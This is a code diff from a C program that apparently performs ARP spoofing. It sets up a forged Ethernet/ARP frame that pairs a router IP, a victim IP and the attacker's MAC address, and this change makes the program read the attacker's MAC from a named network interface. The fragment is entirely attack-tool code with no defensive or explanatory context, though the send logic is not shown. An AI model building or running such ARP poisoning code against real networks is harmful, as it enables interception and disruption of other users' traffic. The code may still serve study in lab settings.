@@ -40,10 +40,31 @@ int main(int ac, char **av)
     struct ifreq iface_req; 
 
     uint32_t ip_rout = inet_addr(av[1]);
-    uint32_t ip_victim = inet_addr(av[2]);
+    uint32_t ip_victim = inet_addr(av[2]);    
+
+    strncpy(iface_req.ifr_name, av[3], IF_NAMESIZE -1);
+
+    int tunnel_hardware = ioctl(sock, SIOCGIFINDEX, &iface_req); 
+    int mac_int = ioctl(sock, SIOCGIFHWADDR, &iface_req);
+
+
+    if (mac_int == -1)
+    {
+        perror("ERROR");
+        exit(EXIT_FAILURE);
+    }
+
+    if (tunnel_hardware == -1)
+    {
+        perror("ERROR");
+        exit(EXIT_FAILURE);
+    }
 
     eth->ether_type = htons(ETHERTYPE_ARP);
-    
+
+    unsigned char *mac = (unsigned char *)iface_req.ifr_hwaddr.sa_data;
+    memcpy(MAC_ATTACKER, mac, ETH_ALEN);
+
     memcpy(eth->ether_shost, MAC_ATTACKER, ETH_ALEN);
     memcpy(eth->ether_dhost, MAC_VICTIM, ETH_ALEN);
 
@@ -58,16 +79,6 @@ int main(int ac, char **av)
 
     memcpy(arp->arp_tha, MAC_VICTIM, ETH_ALEN);
     memcpy(arp->arp_tpa, &ip_victim, sizeof(uint32_t));
-
-    strncpy(iface_req.ifr_name, av[3], IF_NAMESIZE -1);
-
-    int tunnel_hardware = ioctl(sock, SIOCGIFINDEX, &iface_req); 
-
-    if (tunnel_hardware == -1)
-    {
-        perror("ERROR");
-        exit(EXIT_FAILURE);
-    }
 
     int ifindex = iface_req.ifr_ifindex;
     struct sockaddr_ll socket_address;
